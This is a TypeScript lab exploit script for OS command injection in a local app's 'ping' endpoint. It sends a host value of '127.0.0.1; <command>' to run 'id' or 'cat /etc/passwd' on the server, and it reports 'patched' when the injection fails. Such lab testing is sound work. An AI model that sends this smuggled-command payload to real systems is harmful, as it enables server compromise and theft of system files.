// Lab 3 exploit — OS command injection (CWE-78).
// The /api/tools "ping" feature runs `ping -c 1 <host>` through a shell. We
// chain a second command with `;` so it runs with the server's privileges.
//
// Exit 0 = exploit worked (injected command ran). Non-zero = patched.
const BASE = process.env.BASE_URL ?? "http://localhost:3000";
const injected = process.argv[2] ?? "id";

async function main() {
  const host = `127.0.0.1; ${injected}`;
  console.log(`[cmdi] POST /api/tools host="${host}"`);

  const r = await fetch(`${BASE}/api/tools`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ host }),
  });
  const data: any = await r.json().catch(() => ({}));
  const output: string = data.output ?? "";

  console.log("\n--- command output ---");
  console.log(output.trim());
  console.log("----------------------");

  // Heuristics: `id` prints uid=, `cat /etc/passwd` prints root:
  const injectedRan = /uid=\d+|root:.*:0:0:|gid=\d+/.test(output);
  if (injectedRan) {
    console.log("\n  HIT — the injected command executed on the server.");
    process.exit(0);
  }

  console.log("\n  injected command did not run — looks patched.");
  process.exit(1);
}

main();
